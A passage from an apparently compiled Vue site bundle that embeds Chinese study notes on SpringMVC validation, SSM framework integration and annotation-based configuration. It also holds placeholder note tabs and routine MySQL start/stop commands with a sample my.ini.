(JSR 109)\r\n   Java API for XML-Based Web Services (JAX-WS) 2.2 (JSR 224)\r\n   Java Architecture for XML Binding (JAXB) 2.2 (JSR 222)\r\n   Web Services Metadata for the Java Platform (JSR 181)\r\n   Java API for XML-Based RPC (JAX-RPC) 1.1 (JSR 101)\r\n   Java APIs for XML Messaging 1.3 (JSR 67)\r\n   Java API for XML Registries (JAXR) 1.0 (JSR 93)\r\n\r\n* JCP（Java Community Process）：Java社区\r\n\r\n*  Hibernate框架中包含一套独立的校验框架hibernate-validator  \r\n\r\n     导入坐标\r\n\r\n  ```xml\r\n  <dependency>\r\n      <groupId>org.hibernate</groupId>\r\n      <artifactId>hibernate-validator</artifactId>\r\n      <version>6.1.0.Final</version>\r\n  </dependency>\r\n  ```\r\n\r\n  **注意：**\r\n  tomcat7 ：搭配hibernate-validator版本5.*.*.Final\r\n  tomcat8.5↑ ：搭配hibernate-validator版本6.*.*.Final  \r\n\r\n\r\n\r\n## 1.2 快速使用\r\n\r\n**1. 开启校验**\r\n\r\n 名称：@Valid 、 @Validated\r\n 类型：形参注解\r\n 位置：处理器类中的实体类类型的方法形参前方\r\n 作用：设定对当前实体类类型参数进行校验\r\n 范例：  \r\n\r\n```java\r\n@RequestMapping(value = "/addemployee")\r\npublic String addEmployee(@Valid Employee employee) {\r\n    System.out.println(employee);\r\n}\r\n```\r\n\r\n**2.设置校验规则**\r\n\r\n 名称：@NotNull\r\n 类型：属性注解 等\r\n 位置：实体类属性上方\r\n 作用：设定当前属性校验规则\r\n 范例：\r\n    每个校验规则所携带的参数不同，根据校验规则进行相应的调整\r\n    具体的校验规则查看对应的校验框架进行获取\r\n\r\n```java\r\npublic class Employee{\r\n    @NotNull(message = "姓名不能为空")\r\n    private String name;//员工姓名\r\n}  \r\n```\r\n\r\n**3.获取错误信息**\r\n\r\n```java\r\n@RequestMapping(value = "/addemployee")\r\npublic String addEmployee(@Valid Employee employee, Errors errors, Model model){\r\n    System.out.println(employee);\r\n    if(errors.hasErrors()){\r\n        for(FieldError error : errors.getFieldErrors()){\r\n            model.addAttribute(error.getField(),error.getDefaultMessage());\r\n        }\r\n        return "addemployee.jsp";\r\n    }\r\n    return "success.jsp";\r\n}  \r\n```\r\n\r\n  通过形参Errors获取校验结果数据，通过Model接口将数据封装后传递到页面显示  \r\n\r\n```html\r\n<form action="/addemployee" method="post">\r\n    员工姓名：<input type="text" name="name"><span style="color:red">${name}</span><br/>\r\n    员工年龄：<input type="text" name="age"><span style="color:red">${age}</span><br/>\r\n    <input type="submit" value="提交">\r\n</form>\r\n```\r\n\r\n通过形参Errors获取校验结果数据，通过Model接口将数据封装后传递到页面显示\r\n页面获取后台封装的校验结果信息  \r\n\r\n## 1.3 多规则校验\r\n\r\n* 同一个属性可以添加多个校验器  \r\n\r\n```java\r\n@NotNull(message = "请输入您的年龄")\r\n@Max(value = 60,message = "年龄最大值不允许超过60岁")\r\n@Min(value = 18,message = "年龄最小值不允许低于18岁")\r\nprivate Integer age;//员工年龄\r\n```\r\n\r\n* 3种判定空校验器的区别  \r\n\r\n![image-20200506160725709](./img/java/springmvc/SpringMVC-day03/image-20200506160725709.png)\r\n\r\n## 1.4 嵌套校验\r\n\r\n 名称：@Valid\r\n 类型：属性注解\r\n 位置：实体类中的引用类型属性上方\r\n 作用：设定当前应用类型属性中的属性开启校验\r\n 范例：\r\n\r\n```java\r\npublic class Employee {\r\n    //实体类中的引用类型通过标注@Valid注解，设定开启当前引用类型字段中的属性参与校验\r\n    @Valid\r\n    private Address address;\r\n}\r\n```\r\n\r\n 注意：开启嵌套校验后，被校验对象内部需要添加对应的校验规则  \r\n\r\n## 1.5 分组校验\r\n\r\n* 同一个模块，根据执行的业务不同，需要校验的属性会有不同\r\n  * 新增用户\r\n  * 修改用户\r\n* 对不同种类的属性进行分组，在校验时可以指定参与校验的字段所属的组类别\r\n  * 定义组（通用）\r\n  * 为属性设置所属组，可以设置多个\r\n  * 开启组校验\r\n\r\n```java\r\npublic interface GroupOne {\r\n}\r\n```\r\n\r\n```java\r\npublic String addEmployee(@Validated({GroupOne.class}) Employee employee){\r\n}  \r\n```\r\n\r\n\r\n\r\n\r\n```java\r\n@NotEmpty(message = "姓名不能为空",groups = {GroupOne.class})\r\nprivate String name;//员工姓名\r\n```\r\n\r\n# 2 ssm整合\r\n\r\n## 2.1 整合流程简介\r\n\r\n整合步骤分析\r\n\r\nSSM（Spring+SpringMVC+MyBatis）\r\n\r\n* Spring\r\n  * 框架基础\r\n\r\n* MyBatis\r\n  * mysql+druid+pagehelper\r\n\r\n* Spring整合MyBatis\r\n\r\n* junit测试业务层接口\r\n\r\n* SpringMVC\r\n  * rest风格（postman测试请求结果）\r\n  * 数据封装json（jackson）\r\n\r\n* Spring整合SpringMVC\r\n\r\n  * Controller调用Service\r\n\r\n* 其他\r\n\r\n  * 表现层数据封装\r\n\r\n  * 自定义异常\r\n\r\n**表结构**\r\n\r\n![image-20200506093609697](./img/java/springmvc/SpringMVC-day03/image-20200506093609697.png)\r\n\r\n​    最重要的5个步骤\r\n\r\n1. Spring\r\n\r\n2. MyBatis\r\n\r\n3. Spring整合MyBatis\r\n\r\n4. SpringMVC\r\n\r\n5. Spring整合SpringMVC\r\n\r\n\r\n\r\n## 2.2 项目结构搭建\r\n\r\n**Part0：**   项目基础结构搭建\r\n\r\n* 创建项目，组织项目结构，创建包\r\n\r\n* 创建表与实体类\r\n\r\n* 创建三层架构对应的模块、接口与实体类，建立关联关系\r\n\r\n* 数据层接口（代理自动创建实现类）\r\n  * 业务层接口+业务层实现类\r\n  * 表现层类\r\n\r\n\r\n\r\n![image-20200506094053535](./img/java/springmvc/SpringMVC-day03/image-20200506094053535.png)\r\n\r\n\r\n\r\n```java\r\npublic interface UserDao {\r\n    public boolean save(User user);  public boolean update(User user);  \r\n    public boolean delete(Integer uuid);  public User get(Integer uuid);\r\n    public List<User> getAll(int page,int size);\r\n\r\n    public interface UserService {  \r\n        public boolean save(User user);  public boolean update(User user);\r\n        public boolean delete(Integer uuid);\r\n        public User get(Integer uuid);\r\n        public List<User> getAll(int page, int size);\r\n        /**\r\n        用户登录\r\n        @param userName 用户名\r\n        @param password 密码信息\r\n        @return\r\n        */\r\n        public User login(String userName,String password);\r\n    }\r\n```\r\n\r\n\r\n\r\n## 2.3 Spring整合Mybatis（复习）\r\n\r\n**Part1 :**  Spring环境配置\r\n\r\n```xml\r\n<?xml version="1.0" encoding="UTF-8"?>\r\n<beans xmlns="http://www.springframework.org/schema/beans"  xmlns:context="http://www.springframework.org/schema/context"  xmlns:tx="http://www.springframework.org/schema/tx"  xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"  xsi:schemaLocation="http://www.springframework.org/schema/beans  http://www.springframework.org/schema/beans/spring-beans.xsd  http://www.springframework.org/schema/context  http://www.springframework.org/schema/context/spring-context.xsd  http://www.springframework.org/schema/tx  http://www.springframework.org/schema/tx/spring-tx.xsd">\r\n\r\n    \x3c!--开启bean注解扫描--\x3e\r\n    <context:component-scan base-package="com.itheima"/>\r\n\r\n</beans>\r\n\r\n```\r\n\r\n**Part1 :**  Mybatis配置事务\r\n\r\n* MyBatis映射\r\n\r\n  ```xml\r\n  <?xml version="1.0" encoding="UTF-8"?>\r\n  <!DOCTYPE mapper\r\n          PUBLIC "-//mybatis.org//DTD Mapper 3.0//EN"\r\n          "http://mybatis.org/dtd/mybatis-3-mapper.dtd">\r\n  <mapper namespace="com.itheima.dao.UserDao">\r\n  \r\n      \x3c!--添加--\x3e\r\n      <insert id="save" parameterType="user">\r\n          insert into user(userName,password,realName,gender,birthday)values(#{userName},#{password},#{realName},#{gender},#{birthday})\r\n      </insert>\r\n  \r\n      \x3c!--删除--\x3e\r\n      <delete id="delete" parameterType="int">\r\n          delete from user where uuid = #{uuid}\r\n      </delete>\r\n  \r\n      \x3c!--修改--\x3e\r\n      <update id="update" parameterType="user">\r\n          update user set userName=#{userName},password=#{password},realName=#{realName},gender=#{gender},birthday=#{birthday} where uuid=#{uuid}\r\n      </update>\r\n  \r\n      \x3c!--查询单个--\x3e\r\n      <select id="get" resultType="user" parameterType="int">\r\n          select * from user where uuid = #{uuid}\r\n      </select>\r\n  \r\n      \x3c!--分页查询--\x3e\r\n      <select id="getAll" resultType="user">\r\n          select * from user\r\n      </select>\r\n  \r\n      \x3c!--登录--\x3e\r\n      <select id="getByUserNameAndPassword" resultType="user" >\r\n          select * from user where userName=#{userName} and password=#{password}\r\n      </select>\r\n  \r\n  </mapper>\r\n  ```\r\n\r\n  \r\n\r\n* Mybatis核心配置\r\n\r\n  ```xml\r\n  \x3c!--开启注解式事务--\x3e\r\n  <tx:annotation-driven transaction-manager="txManager"/>\r\n  \r\n  \x3c!--加载properties文件--\x3e\r\n  <context:property-placeholder location="classpath*:jdbc.properties"/>\r\n  \r\n  \x3c!--数据源--\x3e\r\n  <bean id="dataSource" class="com.alibaba.druid.pool.DruidDataSource">\r\n      <property name="driverClassName" value="${jdbc.driver}"/>\r\n      <property name="url" value="${jdbc.url}"/>\r\n      <property name="username" value="${jdbc.username}"/>\r\n      <property name="password" value="${jdbc.password}"/>\r\n  </bean>\r\n  \r\n  \x3c!--整合mybatis到spring中--\x3e\r\n  <bean class="org.mybatis.spring.SqlSessionFactoryBean">\r\n      <property name="dataSource" ref="dataSource"/>\r\n      <property name="typeAliasesPackage" value="com.itheima.domain"/>\r\n      \x3c!--分页插件--\x3e\r\n      <property name="plugins">\r\n          <array>\r\n              <bean class="com.github.pagehelper.PageInterceptor">\r\n                  <property name="properties">\r\n                      <props>\r\n                          <prop key="helperDialect">mysql</prop>\r\n                          <prop key="reasonable">true</prop>\r\n                      </props>\r\n                  </property>\r\n              </bean>\r\n          </array>\r\n      </property>\r\n  </bean>\r\n  \r\n  \x3c!--映射扫描--\x3e\r\n  <bean class="org.mybatis.spring.mapper.MapperScannerConfigurer">\r\n      <property name="basePackage" value="com.itheima.dao"/>\r\n  </bean>\r\n  \r\n  \x3c!--事务管理器--\x3e\r\n  <bean id="txManager" class="org.springframework.jdbc.datasource.DataSourceTransactionManager">\r\n      <property name="dataSource" ref="dataSource"/>\r\n  </bean>\r\n  ```\r\n\r\n  \r\n\r\n## 2.4 整合junit\r\n\r\n**Part2：**单元测试整合junit\r\n\r\n```java\r\n@RunWith(SpringJUnit4ClassRunner.class)  \r\n@ContextConfiguration(locations = "classpath:applicationContext.xml")  \r\npublic class UserServiceTest {\r\n\r\n    @Autowired\r\n    private UserService userService;\r\n\r\n    @Test\r\n    public void testDelete(){  \r\n        User user = new User();  userService.delete(3);\r\n    }\r\n}\r\n\r\n```\r\n\r\n\r\n\r\n## 2.5 Spring整合SpringMVC\r\n\r\n**Part3：**SpringMVC\r\n\r\n* web.xml配置\r\n\r\n  ```xml\r\n  <servlet>\r\n      <servlet-name>DispatcherServlet</servlet-name>\r\n      <servlet-class>org.springframework.web.servlet.DispatcherServlet</servlet-class>\r\n      <init-param>\r\n          <param-name>contextConfigLocation</param-name>\r\n          <param-value>classpath*:spring-mvc.xml</param-value>\r\n      </init-param>\r\n  </servlet>\r\n  <servlet-mapping>\r\n      <servlet-name>DispatcherServlet</servlet-name>\r\n      <url-pattern>/</url-pattern>\r\n  </servlet-mapping>\r\n  ```\r\n\r\n* spring-mvc.xml\r\n\r\n  ```xml\r\n  <?xml version="1.0" encoding="UTF-8"?>\r\n  <beans xmlns="http://www.springframework.org/schema/beans"\r\n         xmlns:context="http://www.springframework.org/schema/context"\r\n         xmlns:mvc="http://www.springframework.org/schema/mvc"\r\n         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"\r\n         xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd\r\n          http://www.springframework.org/schema/mvc http://www.springframework.org/schema/mvc/spring-mvc.xsd\r\n          http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context.xsd">\r\n  \r\n      <mvc:annotation-driven/>\r\n  \r\n      <context:component-scan base-package="com.itheima.controller"/>\r\n  \r\n  </beans>\r\n  ```\r\n\r\n* controller层\r\n\r\n  ```java\r\n  @RestController  \r\n  @RequestMapping("/user")  public class UserController {\r\n      @PostMapping\r\n      public boolean save(User user) {  \r\n          System.out.println("save ..." + user);  return true;\r\n      }\r\n      @PostMapping("/login")\r\n      public User login(String userName,String password){  \r\n          System.out.println("login ..." + userName + " ," +password);\r\n          return null;\r\n      }\r\n  }\r\n  ```\r\n\r\n\r\n\r\n**Part4：**Spring整合SpringMVC\r\n\r\n* web.xml加载Spring环境\r\n\r\n  ```xml\r\n  <context-param>\r\n      <param-name>contextConfigLocation</param-name>\r\n      <param-value>classpath*:applicationContext.xml</param-value>\r\n  </context-param>\r\n  \r\n  \x3c!--启动服务器时，通过监听器加载spring运行环境--\x3e\r\n  <listener>\r\n      <listener-class>org.springframework.web.context.ContextLoaderListener</listener-class>\r\n  </listener>\r\n  ```\r\n\r\n* Controller调用Service\r\n\r\n  ```java\r\n  @RestController\r\n  @RequestMapping("/user")\r\n  public class UserController {\r\n      @Autowired\r\n      private UserService userService;\r\n  \r\n  \r\n      @PostMapping\r\n      public boolean save(User user){\r\n          return userService.save(user);\r\n      }\r\n  }\r\n  ```\r\n\r\n## 2.6 表现层数据封装\r\n\r\n**Part5-1：**表现层数据封装\r\n\r\n* 前端接收表现层返回的数据种类\r\n\r\n| u操作是否成功 | true/false | 格式A |\r\n| ------------- | ---------- | ----- |\r\n| u单个数据     | 1,100,true | 格式B |\r\n| u对象数据     | json对象   | 格式C |\r\n| u集合数据     | json数组   | 格式D |\r\n\r\n![image-20200506103851845](./img/java/springmvc/SpringMVC-day03/image-20200506103851845.png)\r\n\r\n\r\n\r\n* 返回数据格式设计\r\n\r\n![image-20200506104339019](./img/java/springmvc/SpringMVC-day03/image-20200506104339019.png)\r\n\r\n* 代码\r\n\r\n  ```java\r\n  public class Result {\r\n      // 操作结果编码\r\n      private Integer code;\r\n      // 操作数据结果\r\n      private Object data;\r\n      // 消息\r\n      private String message;\r\n      public Result(Integer code) {\r\n          this.code = code;\r\n      }\r\n      public Result(Integer code, Object data) {\r\n          this.code = code;\r\n          this.data = data;\r\n      }\r\n  }\r\n  ```\r\n\r\n  状态码常量可以根据自己的业务需求设定\r\n\r\n  ```java\r\n  public class Code {\r\n      public static final Integer SAVE_OK = 20011;\r\n      public static final Integer SAVE_ERROR = 20010;\r\n      //其他编码\r\n  }\r\n  ```\r\n\r\n  controller 调用\r\n\r\n  ```java\r\n  @RestController\r\n  public class UserController {\r\n      @Autowired\r\n      private UserService userService;\r\n      @PostMapping\r\n      public Result save(User user){\r\n          boolean flag = userService.save(user);\r\n          return new Result(flag ? Code.SAVE_OK:Code.SAVE_ERROR);\r\n      }\r\n      @GetMapping("/{uuid}")\r\n      public Result get(@PathVariable Integer uuid){\r\n          User user = userService.get(uuid);\r\n          return new Result(null != user ?Code.GET_OK: Code.GET_ERROR,user);\r\n      }\r\n  }\r\n  ```\r\n\r\n  \r\n\r\n\r\n\r\n## 2.7 自定义异常\r\n\r\n**Part5-2：**自定义异常\r\n\r\n* 设定自定义异常，封装程序执行过程中出现的问题，便于表现层进行统一的异常拦截并进行处理\r\n  * BusinessException\r\n  * SystemException\r\n\r\n* 自定义异常消息返回时需要与业务正常执行的消息按照统一的格式进行处理\r\n\r\n\r\n\r\n**定义BusinessException**\r\n\r\n```java\r\npublic class BusinessException extends RuntimeException {\r\n    //自定义异常中封装对应的错误编码，用于异常处理时获取对应的操作编码\r\n    private Integer code;\r\n\r\n    public Integer getCode() {\r\n        return code;\r\n    }\r\n\r\n    public void setCode(Integer code) {\r\n        this.code = code;\r\n    }\r\n\r\n    public BusinessException(Integer code) {\r\n        this.code = code;\r\n    }\r\n\r\n    public BusinessException(String message, Integer code) {\r\n        super(message);\r\n        this.code = code;\r\n    }\r\n\r\n    public BusinessException(String message, Throwable cause,Integer code) {\r\n        super(message, cause);\r\n        this.code = code;\r\n    }\r\n\r\n    public BusinessException(Throwable cause,Integer code) {\r\n        super(cause);\r\n        this.code = code;\r\n    }\r\n\r\n    public BusinessException(String message, Throwable cause, boolean enableSuppression, boolean writableStackTrace,Integer code) {\r\n        super(message, cause, enableSuppression, writableStackTrace);\r\n        this.code = code;\r\n    }\r\n}\r\n\r\n```\r\n\r\n```java\r\n@GetMapping("/{uuid}")\r\npublic Result get(@PathVariable Integer uuid){\r\n    User user = userService.get(uuid);\r\n    //模拟出现异常，使用条件控制，便于测试结果\r\n    if (uuid == 10 ) throw new BusinessException("查询出错啦，请重试！",Code.GET_ERROR);\r\n    return new Result(null != user ?Code.GET_OK: Code.GET_ERROR,user);\r\n}\r\n```\r\n\r\n\r\n\r\n## **2.8 返回消息兼容异常信息**\r\n\r\n```java\r\n@Component\r\n@ControllerAdvice\r\npublic class ProjectExceptionAdivce {\r\n    @ExceptionHandler(BusinessException.class)\r\n    @ResponseBody\r\n    //对出现异常的情况进行拦截，并将其处理成统一的页面数据结果格式\r\n    public Result doBusinessException(BusinessException e){\r\n        return new Result(e.getCode(),e.getMessage());\r\n    }\r\n}\r\n```\r\n\r\n# 3 纯注解开发SSM\r\n\r\n## 3.1 用注解替代applicationContext.xml\r\n\r\n同前期设置，添加事务注解驱动\r\n@Configuration\r\n\r\n```java\r\n//扫描组件，排除SpringMVC对应的bean，等同于<context:component-scan />\r\n@ComponentScan(value = "com.itheima",excludeFilters = {\r\n    @ComponentScan.Filter(type= FilterType.ANNOTATION,classes = {Controller.class})})\r\n@PropertySource("classpath:jdbc.properties")\r\n@Import({JdbcConfig.class,MyBatisConfig.class})\r\n//等同于<tx:annotation-driven transaction-manager="txManager"/>，导入的默认名称为transactionManager\r\n@EnableTransactionManagement\r\npublic class SpringConfig {\r\n    //等同于<bean   class="org.springframework.jdbc.datasource.DataSourceTransactionManager">\r\n    @Bean("transactionManager")\r\n    public DataSourceTransactionManager getDataSourceTxManager(@Autowired DataSource dataSource){\r\n        DataSourceTransactionManager dtm = new DataSourceTransactionManager();\r\n        //等同于<property name="dataSource" ref="dataSource"/>\r\n        dtm.setDataSource(dataSource);\r\n        return dtm;\r\n    }\r\n}  \r\n```\r\n\r\n## 3.2 用注解替代spring-mvc.xml  \r\n\r\n*   同前期设置，添加@EnableWebMvc注解  \r\n\r\n  ```java\r\n  @Configuration\r\n  @ComponentScan("com.itheima.controller")\r\n  @EnableWebMvc\r\n  public class SpringMvcConfig implements WebMvcConfigurer {\r\n  }\r\n  ```\r\n\r\n*   EnableWebMvc  \r\n\r\n\r\n1. 支持ConversionService的配置，可以方便配置自定义类型转换器\r\n2. 支持@NumberFormat注解格式化数字类型\r\n3. 支持@DateTimeFormat注解格式化日期数据，日期包括Date,Calendar,JodaTime（JodaTime要导包）\r\n4. 支持@Valid的参数校验(需要导入JSR-303规范)\r\n5. 配合第三方jar包和SpringMVC提供的注解读写XML和JSON格式数据  ',pa={data:function(){return{MainComponent:ca}}},ua=pa,ma=Object(u["a"])(ua,oa,la,!1,null,"00956706",null),da=ma.exports,ga={mixins:[sr["a"]],components:{m1:Te,m2:Oe,m3:He,m4:$e,m5:Ze,m6:sa,m7:da},data:function(){return{tab:"m1",tab_level:2,tabs:[{label:"spring IOC",value:"m1"},{label:"spring 注解",value:"m2"},{label:"spring AOP",value:"m3"},{label:"spring 事务",value:"m4"},{label:"springMVC",value:"m5"},{label:"springMVC",value:"m6"},{label:"springMVC",value:"m7"}]}}},ba=ga,va=Object(u["a"])(ba,he,Se,!1,null,"42a83ff4",null),ha=va.exports,Sa={mixins:[sr["a"]],components:{m1:pr,m3:wt,m4:Rr,m5:Kt,m6:ve,m7:ha},data:function(){return{tab:"m1",tab_level:1,tabs:[{label:"JAVA基础",value:"m1"},{label:"javaweb",value:"m3"},{label:"JDBC",value:"m4"},{label:"mybatis",value:"m5"},{label:"maven",value:"m6"},{label:"springmvc",value:"m7"}]}}},ya=Sa,fa=Object(u["a"])(ya,e,a,!1,null,"65191316",null);r["default"]=fa.exports},3327:function(n,r,t){"use strict";t.r(r);var e=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",{staticClass:"q-pa-md"},[t("div",{staticClass:"q-gutter-y-md"},[t("q-tabs",{staticClass:"bg-grey-3",attrs:{dense:"",align:"left"},model:{value:n.tab,callback:function(r){n.tab=r},expression:"tab"}},n._l(n.all_modules,(function(n,r){return t("q-tab",{key:r,attrs:{name:n.component,label:n.text}})})),1),t("div",[t(n.tab,{tag:"component"})],1)],1)])},a=[],i=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[t("div",[n._v("相关关键字")]),t("pre",[n._v("   Android Studio\n   dart  flutter  kotiln  \n   ANDROID_SDK_ROOT\n   ANDROID_HOME\n   adb\n   android\n   dart\n   flutter\n ")]),t("div",[t("ul",n._l(n.link_arr,(function(r,e){return t("li",{key:"link_arr_"+e},[t("a",{attrs:{href:r,target:"_blank",rel:"noopener noreferrer"}},[n._v(n._s(r)+" ")])])})),0)])])},s=[],o={data:function(){return{link_arr:["https://pub.dev/","https://flutter.dev/","https://dart.dev/"]}}},l=o,c=t("2877"),p=Object(c["a"])(l,i,s,!1,null,"47705a15",null),u=p.exports,m=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[n._v("\n 某天的笔记\n")])},d=[],g={},b=g,v=Object(c["a"])(b,m,d,!1,null,"57a07c8c",null),h=v.exports,S=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[n._v("\n 某天的笔记\n")])},y=[],f={data:function(){return{}}},_=f,x=Object(c["a"])(_,S,y,!1,null,null,null),w=x.exports,E=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[n._v("\n 某天的笔记\n")])},T=[],k={},C=k,j=Object(c["a"])(C,E,T,!1,null,"12c3e9c5",null),M=j.exports,R=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[n._v("\n  某天的笔记\n")])},L=[],O={data:function(){return{}}},A=O,I=Object(c["a"])(A,R,L,!1,null,"ec5a9b06",null),D=I.exports,P=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[n._v("\n 某天的笔记\n\n")])},N=[],q={data:function(){return{}}},H=q,B=Object(c["a"])(H,P,N,!1,null,"5616b5d5",null),F=B.exports,U={components:{m1:u,m2:h,m3:w,m4:M,m5:D,m6:F},data:function(){return{tab:"m1",all_modules:[{component:"m1",text:"综述相关"},{component:"m2",text:"某天笔记1"},{component:"m3",text:"某天笔记1"},{component:"m4",text:"某天笔记1"},{component:"m5",text:"某天笔记1"},{component:"m6",text:"某天笔记2"}]}}},J=U,z=Object(c["a"])(J,e,a,!1,null,"503f3401",null);r["default"]=z.exports},"388d":function(n,r,t){"use strict";var e=t("f0ba"),a=t.n(e);a.a},"3afd":function(n,r,t){"use strict";t.r(r);var e=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[t("q-tabs",{staticClass:"text-teal",attrs:{align:"left","inline-label":"",dense:""},model:{value:n.tab,callback:function(r){n.tab=r},expression:"tab"}},n._l(n.tabs,(function(n,r){return t("q-tab",{key:"tabs_"+r,attrs:{name:""+(r+1),label:r+1+"."+n.text}})})),1),t("m"+n.tab,{tag:"component"})],1)},a=[],i=t("9523"),s=t.n(i),o=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[n._v("\n   rrrrrrrrrrrrrrrrrrrr\n")])},l=[],c={},p=c,u=t("2877"),m=Object(u["a"])(p,o,l,!1,null,"71009b84",null),d=m.exports,g=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[n._v("\n    yyyyyyyyyyyyyyyyyyyyyyyy\n")])},b=[],v={},h=v,S=Object(u["a"])(h,g,b,!1,null,"aca6b992",null),y=S.exports,f=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[n._v("\n    1\n")])},_=[],x={},w=x,E=Object(u["a"])(w,f,_,!1,null,"48c9940f",null),T=E.exports,k=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[n._v("\n    1\n")])},C=[],j={},M=j,R=Object(u["a"])(M,k,C,!1,null,"1ed57b50",null),L=R.exports,O=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[n._v("\n    1\n")])},A=[],I={},D=I,P=Object(u["a"])(D,O,A,!1,null,"163d3ade",null),N=P.exports,q=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[n._v("\n    1\n")])},H=[],B={},F=B,U=Object(u["a"])(F,q,H,!1,null,"6a256c5c",null),J=U.exports,z=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[n._v("\n    1\n")])},W=[],$={},G=$,V=Object(u["a"])(G,z,W,!1,null,"be0d9dda",null),Q=V.exports,K=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[n._v("\n    1\n")])},X=[],Y={},Z=Y,nn=Object(u["a"])(Z,K,X,!1,null,"77051854",null),rn=nn.exports,tn={components:{m1:d,m2:y,m3:T,m4:L,m5:N,m6:J,m7:Q,m8:rn},data:function(){return s()({tab:1,tabs:[1,2,3,4,5,6,7,8]},"tabs",[{text:"未开发"},{text:"未开发"},{text:"未开发"},{text:"未开发"},{text:"未开发"},{text:"未开发"},{text:"未开发"},{text:"未开发"}])}},en=tn,an=Object(u["a"])(en,e,a,!1,null,"79daca34",null);r["default"]=an.exports},4067:function(n,r,t){"use strict";t.r(r);var e=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[t("q-tabs",{staticClass:"text-teal",attrs:{align:"left","inline-label":"",dense:""},model:{value:n.tab,callback:function(r){n.tab=r},expression:"tab"}},n._l(n.tabs,(function(n,r){return t("q-tab",{key:"tabs_"+r,attrs:{name:""+(r+1),label:r+1+"."+n.text}})})),1),t("m"+n.tab,{tag:"component"})],1)},a=[],i=t("9523"),s=t.n(i),o=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[n._v("\n   rrrrrrrrrrrrrrrrrrrr\n")])},l=[],c={},p=c,u=t("2877"),m=Object(u["a"])(p,o,l,!1,null,"d98af63a",null),d=m.exports,g=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[n._v("\n    yyyyyyyyyyyyyyyyyyyyyyyy\n")])},b=[],v={},h=v,S=Object(u["a"])(h,g,b,!1,null,"d516a09c",null),y=S.exports,f=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[n._v("\n    1\n")])},_=[],x={},w=x,E=Object(u["a"])(w,f,_,!1,null,"693d9418",null),T=E.exports,k=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[n._v("\n    1\n")])},C=[],j={},M=j,R=Object(u["a"])(M,k,C,!1,null,"bd25c596",null),L=R.exports,O=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[n._v("\n    1\n")])},A=[],I={},D=I,P=Object(u["a"])(D,O,A,!1,null,"77790476",null),N=P.exports,q=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[n._v("\n    1\n")])},H=[],B={},F=B,U=Object(u["a"])(F,q,H,!1,null,"4d84ebb7",null),J=U.exports,z=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[n._v("\n    1\n")])},W=[],$={},G=$,V=Object(u["a"])(G,z,W,!1,null,"2390d2f8",null),Q=V.exports,K=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[n._v("\n    1\n")])},X=[],Y={},Z=Y,nn=Object(u["a"])(Z,K,X,!1,null,"0cc68b8e",null),rn=nn.exports,tn={components:{m1:d,m2:y,m3:T,m4:L,m5:N,m6:J,m7:Q,m8:rn},data:function(){return s()({tab:1,tabs:[1,2,3,4,5,6,7,8]},"tabs",[{text:"未开发"},{text:"未开发"},{text:"未开发"},{text:"未开发"},{text:"未开发"},{text:"未开发"},{text:"未开发"},{text:"未开发"}])}},en=tn,an=Object(u["a"])(en,e,a,!1,null,"b0231f44",null);r["default"]=an.exports},"42b8":function(n,r,t){"use strict";t.r(r);var e=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[t(""+n.tab,{tag:"component"})],1)},a=[],i=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[t(""+n.tab,{tag:"component"})],1)},s=[],o=function(){var n=this,r=n.$createElement;n._self._c;return n._m(0)},l=[function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[t("pre",[n._v("          添加系统变量\nC:\\Program Files\\MySQL\\MySQL Server 8.0\\bin\n\nnet start mysql\n\nmysql restart\n\n\n\n　一、启动方式\n　　1、使用 service 启动：service mysqld start\n　　2、使用 mysqld 脚本启动：/etc/inint.d/mysqld start\n　　3、使用 safe_mysqld 启动：safe_mysqld&\n　　二、停止\n　　1、使用 service 启动：service mysqld stop\n　　2、使用 mysqld 脚本启动：/etc/inint.d/mysqld stop\n　　3、mysqladmin shutdown\n　　三、重启\n　　1、使用 service 启动：service mysqld restart\n　　2、使用 mysqld 脚本启动：/etc/inint.d/mysqld restart\n      ")]),t("hr"),t("pre",[n._v('mysql  my.ini\n\n          [mysql]\ndefault-character-set=utf8\n\n[mysqld]\nport = 3306\ndefault_authentication_plugin=mysql_native_password\nbasedir="C:/Program Files/MySQL/MySQL Server 8.0/"\ndatadir="C:/Program Files/MySQL/MySQL Server 8.0/data/"\ncharacter-set-server = utf8\ndefault-storage-engine = MyISAM\n      ')]),t("hr"),t("pre",[n._v('          mysql  my.ini\n\n          